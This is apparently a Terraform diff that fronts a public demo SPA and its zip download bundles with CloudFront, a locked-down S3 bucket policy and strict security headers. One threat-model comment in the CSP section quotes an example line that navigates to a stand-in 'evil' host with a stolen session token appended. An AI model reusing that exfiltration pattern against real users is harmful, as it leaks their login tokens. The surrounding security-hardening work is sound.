@@ -192,7 +192,8 @@ resource "aws_s3_bucket_acl" "cloudfront_logs" {
     grant {
       grantee {
         type = "CanonicalUser"
-        id   = "c4c1ede66af53448b93c283ce9448c4ba468c9432aa01d700d3878632f77d2d0" # pragma: allowlist secret
+        # Public AWS-documented canonical user id, not a credential.
+        id = "c4c1ede66af53448b93c283ce9448c4ba468c9432aa01d700d3878632f77d2d0" # pragma: allowlist secret
       }
       permission = "FULL_CONTROL"
     }
@@ -304,6 +305,80 @@ resource "aws_s3_bucket_versioning" "flip_ui" {
 }
 
 ############################
+# Public Ark+ demo download assets (optional; prod only)
+#
+# The demo SPA (flip-ui `npm run build:demo`) offers multi-hundred-MB result
+# and model-file bundles for download. Serving them straight from a public
+# S3 prefix exposes raw S3 egress rates to anonymous hotlinking with no
+# throttle; fronting them with CloudFront puts the WAF (rate-limit rule
+# above) and CloudFront's cheaper egress in the path, and lets the bucket
+# drop ALL public access — CloudFront reads it via OAC, exactly like the
+# flip-ui bucket.
+#
+# The bucket is deliberately not Terraform-managed: its lifecycle is manual
+# (bundles are staged by hand per demo release) and it must survive
+# `make destroy`. Terraform manages the access edges only: the
+# public-access block, the OAC-scoped bucket policy, and the CloudFront
+# origin + /ark_demo/assets/* behavior on the main distribution.
+# Everything is gated on DEMO_ASSETS_BUCKET_NAME being non-empty.
+############################
+
+locals {
+  demo_assets_enabled = var.DEMO_ASSETS_BUCKET_NAME != ""
+}
+
+data "aws_s3_bucket" "demo_assets" {
+  count  = local.demo_assets_enabled ? 1 : 0
+  bucket = var.DEMO_ASSETS_BUCKET_NAME
+}
+
+resource "aws_cloudfront_origin_access_control" "demo_assets" {
+  count                             = local.demo_assets_enabled ? 1 : 0
+  name                              = "demo-assets-${var.flip_alb_subdomain}"
+  description                       = "OAC for the Ark+ demo assets S3 bucket"
+  origin_access_control_origin_type = "s3"
+  signing_behavior                  = "always"
+  signing_protocol                  = "sigv4"
+}
+
+# All four blocks on: with OAC in place nothing about this bucket is public
+# any more — a leftover public-read policy (how the demo assets were served
+# before this behavior existed) is replaced by aws_s3_bucket_policy below.
+resource "aws_s3_bucket_public_access_block" "demo_assets" {
+  count                   = local.demo_assets_enabled ? 1 : 0
+  bucket                  = data.aws_s3_bucket.demo_assets[0].id
+  block_public_acls       = true
+  block_public_policy     = true
+  ignore_public_acls      = true
+  restrict_public_buckets = true
+}
+
+# Scoped to the ark_demo/assets/ prefix, not the whole bucket, so only the
+# keys the demo behavior maps to are reachable even through CloudFront —
+# anything else staged in the bucket stays private. No s3:ListBucket: a
+# missing key returns 403 instead of an XML key listing.
+resource "aws_s3_bucket_policy" "demo_assets" {
+  count  = local.demo_assets_enabled ? 1 : 0
+  bucket = data.aws_s3_bucket.demo_assets[0].id
+
+  policy = jsonencode({
+    Version = "2012-10-17"
+    Statement = [{
+      Sid       = "AllowCloudFrontOACDemoAssetsPrefix"
+      Effect    = "Allow"
+      Principal = { Service = "cloudfront.amazonaws.com" }
+      Action    = "s3:GetObject"
+      Resource  = "${data.aws_s3_bucket.demo_assets[0].arn}/ark_demo/assets/*"
+      Condition = {
+        StringEquals = {
+          "AWS:SourceArn" = aws_cloudfront_distribution.flip_ui.arn
+        }
+      }
+    }]
+  })
+}
+
+############################
 # CloudFront: OAC, distribution, bucket policy
 ############################
 
@@ -315,8 +390,11 @@ resource "aws_cloudfront_origin_access_control" "flip_ui" {
   signing_protocol                  = "sigv4"
 }
 
-# SPA deep-link rewriter. Attached to the default (S3) cache behavior
-# only, so /api/* responses keep their real ALB status codes.
+# SPA deep-link rewriter. Attached to the default (S3) cache behavior and
+# (when the demo is enabled) the /ark_demo/* behavior — both serve the same
+# s3-flip-ui origin, one real app at "/" and one second SPA bundled under
+# "/ark_demo/" (see the demo-assets section above). NOT attached to /api/*,
+# so /api/* responses keep their real ALB status codes.
 # IMPORTANT: do not add distribution-level custom_error_response blocks
 # for 403/404 — they are inherited by /api/* and would mask real error
 # codes as 200 index.html (the bug this function exists to avoid).
@@ -325,7 +403,7 @@ resource "aws_cloudfront_function" "spa_rewrite" {
   # character the subdomain might ever contain.
   name    = "flip-ui-spa-rewrite-${replace(var.flip_alb_subdomain, "/[^a-zA-Z0-9]/", "-")}"
   runtime = "cloudfront-js-2.0"
-  comment = "Rewrite SPA deep links (non-asset) to /index.html"
+  comment = "Rewrite SPA deep links (non-asset) to the matching app's index.html"
   publish = true
   code    = <<-EOT
     function handler(event) {
@@ -333,10 +411,19 @@ resource "aws_cloudfront_function" "spa_rewrite" {
       // Known asset extensions pass through so missing assets 404
       // naturally. Using an allowlist (vs. "any path containing a dot")
       // avoids misrouting dotted SPA segments like /v1.2/projects/42.
-      if (/\.(js|css|map|json|html|txt|png|jpe?g|gif|svg|ico|webp|avif|woff2?|ttf|eot)$/i.test(uri)) {
+      // `zip` covers the demo's model-file download bundles under
+      // /ark_demo/assets/*. Without it a request whose behaviour is missing or
+      // mis-provisioned falls through to the SPA rewrite and NAVIGATES THE TAB
+      // TO index.html instead of 404ing — the user sees the app reload rather
+      // than a failed download, which reads as a UI bug (FLIP#794 review).
+      if (/\.(js|css|map|json|html|txt|png|jpe?g|gif|svg|ico|webp|avif|woff2?|ttf|eot|zip)$/i.test(uri)) {
         return event.request;
       }
-      event.request.uri = '/index.html';
+      // The public Ark+ demo is a second SPA under /ark_demo/ in the same
+      // bucket; its deep links must fall back to ITS OWN index.html — falling
+      // back to the top-level one would silently serve the real (Cognito-
+      // gated) app for a demo URL instead of a 404 or the demo shell.
+      event.request.uri = uri.indexOf('/ark_demo/') === 0 ? '/ark_demo/index.html' : '/index.html';
       return event.request;
     }
   EOT
@@ -614,6 +701,141 @@ resource "aws_cloudfront_response_headers_policy" "flip_ui_spa" {
 }
 
 ############################
+# Response headers policy (Ark+ demo SPA, /ark_demo/* only)
+############################
+
+# The demo shares the flip-ui S3 bucket/distribution/origin with the real,
+# authenticated app (same-origin hosting — a separate subdomain was considered
+# and rejected during review).
+#
+# THIS POLICY IS DEFENCE IN DEPTH, NOT AN ORIGIN-ISOLATION BOUNDARY. An earlier
+# revision of this comment claimed `connect-src 'none'` meant a hypothetical XSS
+# in the demo bundle would have "nowhere on the network to send" a token read
+# out of this origin's localStorage. That reasoning does not hold and was
+# corrected in review (FLIP#794):
+#
+#   * CSP has NO directive governing top-level navigation. `navigate-to` was
+#     dropped from CSP3 and ships in no browser; `form-action` covers form
+#     submission only. `location.href = "https://evil/?t=" + token` is
+#     unaffected by anything in this policy.
+#   * Same-origin hosting gives the demo bundle full access to the real app's
+#     localStorage and cookies no matter what this header says. connect-src
+#     constrains where the page may *connect*, not what it may *read*.
+#
+# So the residual risk is real and accepted: a script-injection bug in the demo
+# bundle could read a signed-in user's Cognito tokens from the shared origin and
+# exfiltrate them by navigation. What actually keeps that closed today is that
+# the demo has no injection sink — no v-html/innerHTML outside a test file, and
+# a register that is static JSON compiled into the bundle rather than
+# attacker-supplied input — plus the fact that it never runs authenticated code
+# paths. A separate origin (e.g. demo.flip.aicentre.co.uk) is the only control
+# that would genuinely separate the two token stores; treat that as the fix if
+# the demo ever grows a dynamic content path.
+#
+# What this policy DOES buy: it blocks the whole fetch/XHR/WebSocket class of
+# exfiltration and any third-party resource load, which is the cheap majority of
+# the attack surface, and it enforces the "zero egress" property the demo design
+# rests on. The demo's Mirage mock never touches the real browser network stack
+# (Pretender replaces window.XMLHttpRequest/fetch outright), so `connect-src
+# 'none'` costs no demo functionality — confirmed by the PR's Chrome net-log
+# audit (no egress besides 127.0.0.1) and by the mocks/__tests__ egress spec.
+#
+# Shipped enforcing (not report-only), unlike flip_ui_spa's CSP: every resource
+# the demo loads is 'self' (no third-party CDN that could break
+# unpredictably), and there is no established live-traffic population to observe
+# for false positives the way the real app's CSP rollout needed. Note the demo
+# therefore enforces `style-src 'self'` while the real app still runs that
+# report-only — worth an eyeball on any page that injects a runtime <style>
+# (CodeMirror does, on the cohort-query page) before a public launch.
+resource "aws_cloudfront_response_headers_policy" "ark_demo_spa" {
+  count   = local.demo_assets_enabled ? 1 : 0
+  name    = "flip-ui-ark-demo-${replace(var.flip_alb_subdomain, "/[^a-zA-Z0-9]/", "-")}"
+  comment = "Security response headers for the public Ark+ demo SPA at ${var.flip_alb_subdomain}/ark_demo/"
+
+  security_headers_config {
+    strict_transport_security {
+      access_control_max_age_sec = 31536000
+      include_subdomains         = true
+      preload                    = false
+      override                   = true
+    }
+
+    content_type_options {
+      override = true
+    }
+
+    referrer_policy {
+      referrer_policy = "strict-origin-when-cross-origin"
+      override        = true
+    }
+
+    frame_options {
+      frame_option = "DENY"
+      override     = true
+    }
+
+    content_security_policy {
+      content_security_policy = join(" ", [
+        "default-src 'self';",
+        # No real backend, no Cognito, no CDN — the demo's Mirage mock
+        # answers everything in-page. 'none' also hard-blocks any real
+        # request a hypothetical XSS payload might try to exfiltrate over.
+        "connect-src 'none';",
+        "img-src 'self' data:;",
+        "style-src 'self';",
+        "script-src 'self';",
+        "object-src 'none';",
+        "frame-ancestors 'none';",
+        # Extra hardening not yet applied to the real app's (report-only,
+        # in-progress) CSP: safe to ship immediately here since the demo is
+        # a static, self-contained bundle with no legitimate use for a
+        # <base> tag or a form POST target.
+        "base-uri 'none';",
+        "form-action 'none';",
+      ])
+      override = true
+    }
+  }
+}
+
+# Response headers policy (Ark+ demo DOWNLOAD BUNDLES, /ark_demo/assets/* only)
+#
+# These are zips, not HTML, so they need no CSP — but they were the only
+# behaviour on the distribution with NO response-headers policy at all, meaning
+# hand-staged objects were served off the production origin with no `nosniff`
+# and no HSTS (FLIP#794 review). `nosniff` is the one that matters: it stops a
+# bundle uploaded with a wrong or missing Content-Type from being sniffed and
+# rendered as a document on the same origin as the real app.
+resource "aws_cloudfront_response_headers_policy" "ark_demo_assets" {
+  count   = local.demo_assets_enabled ? 1 : 0
+  name    = "flip-ui-ark-demo-assets-${replace(var.flip_alb_subdomain, "/[^a-zA-Z0-9]/", "-")}"
+  comment = "Security response headers for the public Ark+ demo download bundles at ${var.flip_alb_subdomain}/ark_demo/assets/"
+
+  security_headers_config {
+    strict_transport_security {
+      access_control_max_age_sec = 31536000
+      include_subdomains         = true
+      preload                    = false
+      override                   = true
+    }
+
+    content_type_options {
+      override = true
+    }
+
+    frame_options {
+      frame_option = "DENY"
+      override     = true
+    }
+
+    referrer_policy {
+      referrer_policy = "strict-origin-when-cross-origin"
+      override        = true
+    }
+  }
+}
+
+############################
 # Response headers policy (/api/* responses)
 ############################
 
@@ -679,6 +901,17 @@ resource "aws_cloudfront_distribution" "flip_ui" {
     }
   }
 
+  # Ark+ demo download assets (see the demo-assets section above). Present
+  # only when DEMO_ASSETS_BUCKET_NAME is set.
+  dynamic "origin" {
+    for_each = local.demo_assets_enabled ? [1] : []
+    content {
+      domain_name              = data.aws_s3_bucket.demo_assets[0].bucket_regional_domain_name
+      origin_id                = "s3-demo-assets"
+      origin_access_control_id = aws_cloudfront_origin_access_control.demo_assets[0].id
+    }
+  }
+
   default_cache_behavior {
     target_origin_id           = "s3-flip-ui"
     viewer_protocol_policy     = "redirect-to-https"
@@ -706,6 +939,54 @@ resource "aws_cloudfront_distribution" "flip_ui" {
     cache_policy_id            = local.cloudfront_policy_caching_disabled
     origin_request_policy_id   = aws_cloudfront_origin_request_policy.flip_api.id
     response_headers_policy_id = aws_cloudfront_response_headers_policy.flip_api.id
+  }
+
+  # Ark+ demo downloads: read-only, immutable zips, so CachingOptimized is
+  # safe and keeps repeat downloads off S3. No viewer function — these are
+  # direct file downloads, not HTML — but they do carry a headers policy
+  # (nosniff/HSTS, no CSP; see ark_demo_assets above). Listed
+  # BEFORE /ark_demo/* below: CloudFront evaluates ordered_cache_behavior
+  # blocks in list order and uses the first path_pattern match, so the more
+  # specific "/ark_demo/assets/*" must precede the broader "/ark_demo/*" or
+  # every demo-assets download would be swallowed by the SPA behavior and
+  # served (wrongly) from the flip-ui bucket instead of the assets bucket.
+  dynamic "ordered_cache_behavior" {
+    for_each = local.demo_assets_enabled ? [1] : []
+    content {
+      path_pattern               = "/ark_demo/assets/*"
+      target_origin_id           = "s3-demo-assets"
+      viewer_protocol_policy     = "redirect-to-https"
+      allowed_methods            = ["GET", "HEAD"]
+      cached_methods             = ["GET", "HEAD"]
+      compress                   = true
+      cache_policy_id            = local.cloudfront_policy_caching_optimized
+      response_headers_policy_id = aws_cloudfront_response_headers_policy.ark_demo_assets[0].id
+    }
+  }
+
+  # Ark+ demo SPA (everything under /ark_demo/ that isn't a downloadable
+  # bundle): same s3-flip-ui origin and bucket as the real app, just a
+  # different prefix, with its own strict CSP (see
+  # aws_cloudfront_response_headers_policy.ark_demo_spa above) and the
+  # prefix-aware spa_rewrite function for deep-link fallback. Must be
+  # listed after "/ark_demo/assets/*" — see the precedence note above.
+  dynamic "ordered_cache_behavior" {
+    for_each = local.demo_assets_enabled ? [1] : []
+    content {
+      path_pattern               = "/ark_demo/*"
+      target_origin_id           = "s3-flip-ui"
+      viewer_protocol_policy     = "redirect-to-https"
+      allowed_methods            = ["GET", "HEAD"]
+      cached_methods             = ["GET", "HEAD"]
+      compress                   = true
+      cache_policy_id            = local.cloudfront_policy_caching_optimized
+      response_headers_policy_id = aws_cloudfront_response_headers_policy.ark_demo_spa[0].id
+
+      function_association {
+        event_type   = "viewer-request"
+        function_arn = aws_cloudfront_function.spa_rewrite.arn
+      }
+    }
   }
 
   restrictions {
